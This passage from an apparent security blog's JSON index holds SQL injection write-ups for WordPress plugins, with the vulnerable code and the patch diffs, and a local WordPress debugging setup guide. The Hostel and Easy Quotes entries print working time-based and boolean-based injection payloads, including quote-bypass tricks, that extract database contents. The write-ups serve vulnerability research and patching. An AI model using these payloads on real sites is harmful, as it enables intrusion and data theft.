\u003cstrong\u003eTaskbuilder\u003c/strong\u003e WordPress plugin before version \u003cstrong\u003e4.0.2\u003c/strong\u003e. This could allow an attacker to directly interact with your database, including, but not limited to, stealing information.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Taskbuilder Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS Severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e: v4.0.1 (vulnerable) and v4.0.2 (patched)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDiff Tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any tool that can compare files to see differences between two versions\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eThe application \u003cstrong\u003esanitizes input data\u003c/strong\u003e before using it in SQL queries. However, during query construction, this value is inserted directly without being wrapped in single quotes \u003ccode\u003e'...'\u003c/code\u003e. This allows an attacker to inject valid SQL syntax (such as \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e, etc.) into the query, resulting in a SQL Injection vulnerability.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"A vulnerability in the Hostel plugin prior to version 1.1.5.7. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed) diff tool: meld or any tool capable of comparing two versions to show differences Analysis The root cause is that the application injects data from a GET request directly into an SQL query while the validation/whitelisting is insufficient.\nPatch Diff Use any diff tool to compare the vulnerable version and the patched version. A clear difference exists in the file controllers/bookings.php\nVulnerable version:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Patched version:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } 👉 The patch uses a whitelist to restrict which columns can be used for ordering; if the supplied value is not valid it falls back to 'tB.id'.\nAnalysis: The vulnerability appears because the ob parameter is passed directly into the ORDER BY clause after sanitize_text_field(). That function only escapes/cleans text for HTML contexts and does not validate or filter for SQL injection in an SQL context.\nHow it works To inject, we need to identify the complete query used here:\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); The query resides in the default branch of the switch structure.\nAll this logic belongs to the static manage() method of the WPHostelBookings class.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } In WordPress, plugins communicate with core via the Plugin API (Hook System). Therefore, to find where manage() is invoked, we can search for the string \u0026quot;manage\u0026quot; in the plugin folder.\nIn the file models/hostel.php we have:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } Here:\nadd_menu_page() creates the main menu in the Admin Dashboard. add_submenu_page() adds submenu items under that menu. The $callback parameter is the callback function invoked when a user clicks the menu/submenu. Example:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() All these menu/submenu items are registered inside the static menu() method of the WPHostel class. To locate where menu() is called, search for the menu hook in the plugin directory.\nIn the plugin root file hostel.php we have:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() is the WordPress Plugin API that attaches a callback to an action hook. The hook name here is admin_menu, meaning WPHostel::menu() will be called during the lifecycle when WordPress builds the Admin Dashboard Menu. Menu in the Admin UI\nDebugging\nThe faulty functionality is in the Booking Manager, so navigate to the Manage Bookings submenu in the Admin UI.\nRight before the default branch there is a comment // list bookings — indicating this code handles listing and ordering bookings.\nOpen your debugger:\nClick Run with Debugger. Set a breakpoint at the switch branch that contains the vulnerable code and at the exact line that assigns the vulnerable value. When you click a column header in the bookings table, observe:\nThe debugger steps into the switch. Use Step Over to reach the default branch. Continue Step Over and inspect variables in Variables \u0026gt; Locals. These variables combine to form the SQL query below. After combining the variables, the full query looks like:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... Notably, the $orderby variable is assigned as:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ⚠️ Issues here:\nThe part after ORDER BY uses sanitize_text_field(). That function only cleans HTML, and does not validate or filter input to make it safe in an SQL context. Therefore the ob parameter (provided by the user) can be abused to inject SQL directly. Exploit Detecting SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 We separate the ORDER BY clause with a comma because it accepts multi-column values.\nResult: the response time is delayed → SQL Injection succeeded.\nDumping Data from the Database Bypass ' using ORD():\nTo dump database data we need to extract characters such as the first character of the database name.\nBecause sanitize_text_field() removes single quotes ('), we cannot use payloads relying on '. Instead, use ORD() to compare character ASCII codes:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Bypass succeeds → we can extract the database name.\nBypass ' using Hex encoding (alternative)\nBesides ORD() we can use Hex encoding to bypass:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Bypass succeeds → database name can be extracted.\nConclusion The vulnerability CVE-2025-39566 in the WordPress Hostel plugin (versions prior to 1.1.5.7) stems from inserting user-supplied input directly into an SQL query without adequate safeguards, leading to SQL Injection.\nKey takeaways:\nsanitize_text_field() ≠ protection against SQL Injection Distinguish clearly between input cleaning for HTML contexts and validation/sanitization for SQL contexts References SQL Injection Cheat Sheet – PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eA vulnerability in the \u003cstrong\u003eHostel\u003c/strong\u003e plugin prior to version \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any tool capable of comparing two versions to show differences\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eThe root cause is that the application injects data from a \u003cstrong\u003eGET\u003c/strong\u003e request directly into an SQL query while the validation/whitelisting is insufficient.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress is a powerful and the most popular content management system (CMS) that allows you to create, manage, and customize websites and blogs easily. It’s an open-source CMS, built on PHP, and uses either MySQL or MariaDB databases.\nReleased in 2003, initially as a blogging platform, later evolved into a full-featured system for websites, online stores, forums, landing pages, etc. Today, more than 40% of websites worldwide run on WordPress. There are two versions of WordPress:\nWordPress.com\nHosting service provided by Automattic You only need to register an account, no installation required Limited customization, advanced features require payment WordPress.org\nOpen-source, you download and install it on your own hosting/server Full customization, install plugins, themes, write code, build any website you want Ecosystem Core: The main CMS Plugins: Add-on software installed on a WordPress site to extend functionality and add new features Themes: Add-on software that defines the visual appearance and layout of a WordPress site Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Currently, over 40% of all websites worldwide run WordPress This means hackers only need to find one common vulnerability =\u0026gt; they can exploit millions of sites at once Like the saying: “fish where the fish are” Plugin and Theme WordPress Core has been reviewed for a long time by thousands of developers and researchers, making it difficult for attackers to break in However, tens of thousands of plugins and themes from various sources are in use, with inconsistent quality Many plugins have poor security code or are no longer updated. Hackers only need to scan plugins/themes for outdated versions and exploit them Setup WordPress for Hacking There are many ways to set up WordPress; searching on Google will show plenty of guides. Here, I’ll set it up on an Ubuntu (22.04) virtual machine:\nNo effect on the host machine’s services WordPress is lightweight enough to run in a VM Install and Configure WordPress Install Dependencies Install the full stack needed to run WordPress (web server + database + PHP + required extensions).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Download and install WordPress source code into the web directory.\n# Create a folder to store the website source code sudo mkdir -p /srv/www # Change owner to www-data, the default user for Apache/Nginx web server sudo chown www-data: /srv/www # Download the latest WordPress package from the official site # Extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www To download a specific version:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable method:\nUbuntu provides a wordpress package in its repo, but it’s usually outdated compared to the official release. The WordPress community only supports the official release. If you encounter issues with the Ubuntu package, they won’t help. Configure Apache for WordPress Create /etc/apache2/sites-available/wordpress.conf:\n\u0026lt;VirtualHost *:80\u0026gt; DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; Enable WordPress site:\nsudo a2ensite wordpress Enable mod_rewrite:\nsudo a2enmod rewrite Disable default site (optional):\nsudo a2dissite 000-default Or add ServerName mywordpress.local in VirtualHost and update your system’s hosts file.\nReload Apache:\nsudo service apache2 reload Configure Database Open MySQL:\nsudo mysql -u root Create DB and user:\nCREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit Restart MySQL:\nsudo service mysql start Configure WordPress DB Connection Copy and edit config:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php Update DB info:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php Add secret keys/salts from: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Visit http://localhost and set site title, username, password, email for the admin user.\nSetup Debug on VSCode To understand request flow, we need debugging.\nAdd PHP Debug Extension In VS Code Extensions (Ctrl+Shift+X) =\u0026gt; search PHP Debug (by Felix Becker) =\u0026gt; Install.\nInstall Xdebug sudo apt install php-xdebug -y php -v If you see with Xdebug v3.x.x, installation is OK.\nConfigure Xdebug Edit php.ini:\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Open project in VS Code:\ncode /srv/www/wordpress Add launch.json:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } Now WordPress is fully set up locally with VS Code debugging.\nExtend Required Version Each WordPress version requires a compatible PHP version. Check this to avoid setup errors.\nWordPress Auto Update Since WordPress 3.7 (2013), background automatic updates exist for:\nSecurity releases Maintenance releases Not for major versions (unless explicitly enabled) WordPress checks api.wordpress.org for updates and applies them automatically.\nTo disable auto-updates, add in wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size By default, WordPress relies on PHP configuration (upload_max_filesize, post_max_size, and sometimes max_execution_time) to determine the maximum file size that can be uploaded. On many servers, this limit is set as low as 2MB – 8MB, which is not enough for modern plugins.\nWhy Increase the Limit? Large plugins: Some plugins such as WooCommerce extensions, page builders, backup tools, or security suites can easily reach 20MB – 100MB.\nAvoid errors: If the plugin .zip file exceeds the limit, you’ll see errors like:\n“The uploaded file exceeds the upload_max_filesize directive in php.ini” Or the upload process fails silently. Ease of use: Increasing the limit allows administrators to upload plugins directly from the WordPress Dashboard without needing FTP/SSH access.\nDevelopment and testing: Developers testing their own plugins (with bundled assets like JS, CSS, images, or libraries) may generate larger .zip files. A higher limit makes local testing smoother.\nHow to Increase Plugin Upload Size There are several methods depending on your hosting environment:\nEdit php.ini (if you control the server)\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Edit .htaccess (for Apache servers)\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Update wp-config.php Add before the line /* That's all, stop editing! Happy publishing. */:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); 👉 It’s recommended to set a reasonable value (e.g., 64MB or 128MB). Avoid setting it too high (hundreds of MBs), as it may open the door to abuse (e.g., users uploading excessively large files that overload the server).\n","permalink":"//localhost:1313/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e is a powerful and the most popular content management system (CMS) that allows you to create, manage, and customize websites and blogs easily. It’s an open-source CMS, built on PHP, and uses either MySQL or MariaDB databases.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eReleased in 2003, initially as a blogging platform, later evolved into a full-featured system for websites, online stores, forums, landing pages, etc.\u003c/li\u003e\n\u003cli\u003eToday, more than 40% of websites worldwide run on WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThere are two versions of WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"The vulnerability exists in the Easy Quotes plugin for WordPress prior to version 1.2.3. This could allow attackers to directly interact with your database, including but not limited to data theft.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vulnerable) and v1.2.3(fixed) diff tool: meld or any other tool to compare and see differences between the two versions Analysis The application directly injected user input into an SQL query without using safeguards, leading to an SQL Injection vulnerability.\nPatch Diff Use any diff tool to compare the vulnerable and patched versions. A clear difference can be found in the file includes/quotes-data.php:\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } The patch uses $wpdb-\u0026gt;prepare() instead of directly injecting user input into the query:\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } Several other functions were patched the same way, such as: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nAlthough get_fonts_categories() was also patched, it did not handle user input, so it was not a concern:\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } How it works The SQL Injection resides in get_family_data($family), and similar logic applies to other functions.\nget_family_data() is a private method inside the Quotes_Data class:\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } get_family_data() is called by both get_family() and get_font_variants(). To locate where they’re used, we can search using the keywords get_family or get_font_variants:\nThe method get_font_variants() is invoked in the rest_route_callback_font_variants() method of the Quotes_Rest_Route class:\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } The constructor of Quotes_Rest_Route uses add_action(hook_name, callback) with hook_name set to rest_api_init to register custom endpoints with WordPress’s REST API system.\nThe callback rest_api_init repeatedly uses register_rest_route to create endpoints under the layart/v1 namespace.\nrest_route_callback_font_variants serves as the callback for the endpoint:\n/wp-json/layart/v1/font-variants?family=family_name If no family parameter is provided, the default value is \u0026quot;Shadows Into Light\u0026quot;.\nExploit Detect SQLi We attempt Boolean-based SQL Injection to test whether the family parameter is injectable.\nTrue request: Executed query:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; Since AND '1'='1' is always true, the query is valid and returns normal data.\nFalse request: Executed query:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; Since AND '1'='2' is always false, the query returns [].\nGet First Letter of Database Name To dump all data, it’s essential to first extract at least one character of the database name.\nIn this case, the database name is wordpress, so the first letter is w.\nThe response returns valid data, confirming the first character is w.\nExecuted query:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Conclusion The CVE-2025-26943 vulnerability in the WordPress Easy Quotes plugin before version 1.2.3 stems from not using query preparation ($wpdb-\u0026gt;prepare) and directly concatenating user input into SQL statements, leading to SQL Injection.\nThe official patch replaces string concatenation with $wpdb-\u0026gt;prepare, ensuring safer input handling.\nKey takeaways:\nAlways use $wpdb-\u0026gt;prepare() when working with databases in WordPress to prevent SQL Injection. Regularly update plugins and perform security audits to avoid becoming a target. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/posts/2025-09-23-cve-2025-26943/","summary":"\u003cp\u003eThe vulnerability exists in the \u003cstrong\u003eEasy Quotes\u003c/strong\u003e plugin for WordPress prior to version \u003cstrong\u003e1.2.3\u003c/strong\u003e. This could allow attackers to directly interact with your database, including but not limited to data theft.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL 